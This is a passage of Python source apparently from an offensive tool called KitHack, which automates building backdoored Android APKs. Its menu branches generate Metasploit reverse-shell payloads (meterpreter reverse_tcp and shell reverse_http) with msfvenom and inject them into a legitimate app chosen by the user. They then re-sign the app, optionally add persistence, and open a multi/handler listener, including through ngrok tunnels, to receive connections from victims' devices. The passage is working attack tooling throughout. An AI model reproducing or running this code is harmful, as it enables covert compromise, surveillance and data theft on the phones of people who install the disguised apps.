						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			

					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()	

			elif pay == '04':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))												
						mainout = os.path.splitext(OUT)[0]	
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))											
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)
					
					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()			

					else:
						print("{}\n[X] INVALID OPTION\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] INVALID OPTION\n".format(RED))
					time.sleep(3)
					pause("{}Press any key to continue...".format(GREEN))
					os.system('clear')
					main()

			elif pay == '05':
				print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
				
				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				a = a.zfill(2)
				
				if a == '01':
					run_network()
					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
						break
					else:
						Tk().withdraw()
						icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
						print("\n{0}ICON: {1}".format(YELLOW, icon))						
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))												
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))	
						file = open("/tmp/data.txt", "w")
						file.write(icon + '\n')
						file.write(mainout)
						file.close()
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
						time.sleep(4)						
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/payload -o output/kithack.apk')
						location = os.getcwd()
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()

					# Salida de bucle
					OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))						
					mainout = os.path.splitext(OUT)[0]
					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
					location = os.getcwd()
					if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
						while var.upper() != "N":
							print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
							time.sleep(4)				 								
							ext = mainout + '.apk'
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
							break						
						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
						if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							if not ".tcp.ngrok.io" in LHOST:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
								pause("\n{}Press any key to continue...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
					else:
						print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
						time.sleep(3)
						pause("{}Press any key to continue...".format(GREEN))
						os.system('systemctl stop postgresql && clear')
						main()	
				
				elif a == '02':
					print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					m = m.zfill(2)

					if m == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
							pause("{}Press any key to continue...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Output File Name: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/kithack.apk')
						if os.path.isfile('output/kithack.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] Do you wish to run msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()								
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
									pause("\n{}Press any key to continue...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] An error has occured whilst generating the backdoor\n".format(RED))
							time.sleep(3)
